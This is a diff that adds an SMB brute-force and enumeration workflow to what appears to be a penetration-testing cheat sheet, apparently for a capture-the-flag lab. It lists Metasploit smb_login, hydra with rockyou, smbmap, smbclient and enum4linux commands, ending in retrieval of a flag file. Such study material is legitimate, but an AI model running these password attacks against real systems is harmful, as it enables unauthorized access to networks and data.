@@ -256,6 +256,38 @@ exploit
 | SMB List | `smbclient -L \\\\[IP]` |
 | SMB Access | `smbclient \\\\[IP]\\[Share]` |
 
+
+---
+
+### SMB Enumeration & Exploitation Flow
+
+1. **SMB Login Bruteforce (Metasploit)**
+   ```bash
+   msfconsole -q
+   use auxiliary/scanner/smb/smb_login
+   set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt
+   set SMBUser <USERNAME>
+   set RHOSTS <TARGET>
+   exploit
+   gzip -d /usr/share/wordlists/rockyou.txt.gz
+   hydra -l <USERNAME> -P /usr/share/wordlists/rockyou.txt <TARGET> smb
+   smbmap -H <TARGET> -u <USERNAME> -p <PASSWORD>
+   smbclient -L <TARGET> -U <USERNAME>
+   smbclient //<TARGET>/<SHARE> -U <USERNAME>
+   ls
+   cd hidden
+   get flag.tar.gz
+   exit
+   tar -xf flag.tar.gz
+   cat flag
+   msfconsole -q
+   use auxiliary/scanner/smb/pipe_auditor
+   set SMBUser <USERNAME>
+   set SMBPass <PASSWORD>
+   set RHOSTS <TARGET>
+   exploit
+   enum4linux -r -u "<USERNAME>" -p "<PASSWORD>" <TARGET>
+   ```
 ---
 
 ### Dictionary & Wordlist Generation
